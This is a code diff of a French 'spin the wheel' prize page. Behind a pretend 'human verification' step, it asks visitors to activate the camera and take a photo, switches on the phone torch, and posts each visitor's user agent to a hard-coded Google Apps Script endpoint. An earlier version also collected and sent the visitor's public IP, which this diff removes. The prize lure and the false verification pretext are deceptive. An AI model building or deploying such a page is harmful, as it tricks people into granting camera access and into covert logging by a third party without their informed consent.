@@ -12,7 +12,6 @@
     #pointer { position: absolute; top: -20px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 20px solid transparent; border-right: 20px solid transparent; border-bottom: 40px solid red; }
     button { background: #0077cc; color: white; border: none; border-radius: 6px; padding: 1rem 2rem; font-size: 1rem; cursor: pointer; margin-top: 1rem; }
     #result { margin-top: 1.5rem; font-size: 1.2rem; font-weight: bold; }
-    #ip { margin-top: 1rem; color: #555; }
     #camera-check { margin: 1.5rem 0; }
   </style>
 </head>
@@ -21,8 +20,11 @@
 
   <!-- Vérification humaine -->
   <div id="camera-check">
-    <p>Veuillez prendre une photo pour confirmer que vous êtes humain :</p>
-    <input type="file" id="humanPhoto" accept="image/*" capture="environment">
+    <p>Autorisez d'abord la caméra pour vérification :</p>
+    <button id="startCamera">Activer la caméra</button>
+    <br><br>
+    <p>Ensuite, prenez une photo :</p>
+    <input type="file" id="humanPhoto" accept="image/*" capture="environment" disabled>
   </div>
 
   <div id="wheel-container">
@@ -31,18 +33,15 @@
   </div>
   <button id="spin" disabled>Tourner la roue</button>
   <div id="result"></div>
-  <div id="ip">Ton IP : …</div>
 
   <script>
-    // === CONFIGURATION ===
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwZXgbARl8oWKtY4Dm9v7dLizLwsx8QT17EaaoGizSPRE7yOxtwySOMwS_QFgeaXVQ2Kg/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxIlUiIbtwbaV1Ohmoz530D3Dp3R-jOVz1HLh_Xb3jbyeErFoc8HMVevoV2BZXdIuboyg/exec";
 
     // --- Dessin roue ---
     const wheelCanvas = document.getElementById("wheel");
     const ctx = wheelCanvas.getContext("2d");
     const segments = ["🎁 -10%", "🚚 Livraison gratuite", "🎧 Goodie", "🎟 5€ bon", "🎉 15%", "❌ Pas de gain"];
     const colors = ["#f44336", "#4caf50", "#ffeb3b", "#2196f3", "#ff9800", "#9c27b0"];
-
     function drawWheel() {
       const arc = (2 * Math.PI) / segments.length;
       for (let i = 0; i < segments.length; i++) {
@@ -74,9 +73,7 @@
           torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
           torchTrack = torchStream.getVideoTracks()[0];
         }
-      } catch (e) {
-        console.log("Erreur accès caméra:", e);
-      }
+      } catch (e) { console.log("Erreur accès caméra:", e); }
     }
     async function toggleTorch(on) {
       try {
@@ -93,17 +90,13 @@
     document.getElementById("spin").addEventListener("click", async () => {
       if (spinning) return;
       spinning = true;
-
       await toggleTorch(true);
-
       const arc = (2 * Math.PI) / segments.length;
       const spinAngle = Math.floor(Math.random() * segments.length);
       const extraSpins = 5;
       const finalAngle = (extraSpins * 2 * Math.PI) + (spinAngle * arc) + arc / 2;
-
       wheelCanvas.style.transition = "transform 4s cubic-bezier(0.33, 1, 0.68, 1)";
       wheelCanvas.style.transform = `rotate(${finalAngle}rad)`;
-
       setTimeout(async () => {
         const result = segments[segments.length - 1 - spinAngle];
         document.getElementById("result").textContent = "🎊 Bravo ! " + result;
@@ -112,45 +105,30 @@
       }, 4000);
     });
 
-    // --- Récupération IP ---
-    async function getPublicIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        document.getElementById("ip").textContent = "Ton IP : " + data.ip;
-        return data.ip;
-      } catch(e) {
-        document.getElementById("ip").textContent = "Impossible de récupérer l’IP.";
-        return "IP inconnue";
-      }
-    }
-
-    // --- Envoi vers Apps Script (FormData, compatible mobile) ---
+    // --- Envoi vers Apps Script ---
     async function logVisitor() {
-      const ip = await getPublicIP();
-      const userAgent = navigator.userAgent;
-
       try {
         const data = new FormData();
-        data.append("ip", ip);
-        data.append("userAgent", userAgent);
-
-        await fetch(SCRIPT_URL, {
-          method: "POST",
-          body: data
-        });
-      } catch (e) {
-        console.log("Erreur envoi Apps Script:", e);
-      }
+        data.append("ip", ""); // IP supprimée côté front
+        data.append("userAgent", navigator.userAgent);
+        await fetch(SCRIPT_URL, { method: "POST", body: data });
+      } catch (e) { console.log("Erreur envoi Apps Script:", e); }
     }
 
     // --- Vérification humaine ---
+    const startCameraBtn = document.getElementById("startCamera");
     const photoInput = document.getElementById("humanPhoto");
+
+    startCameraBtn.addEventListener("click", async () => {
+      await initCamera();
+      startCameraBtn.disabled = true;
+      photoInput.disabled = false; // autoriser ensuite la photo
+    });
+
     photoInput.addEventListener("change", async () => {
       if (photoInput.files.length > 0) {
-        await initCamera();      // active caméra et torche dispo
         document.getElementById("spin").disabled = false;
-        await logVisitor();      // envoie log une seule fois
+        await logVisitor(); // envoie log
       }
     });
   </script>
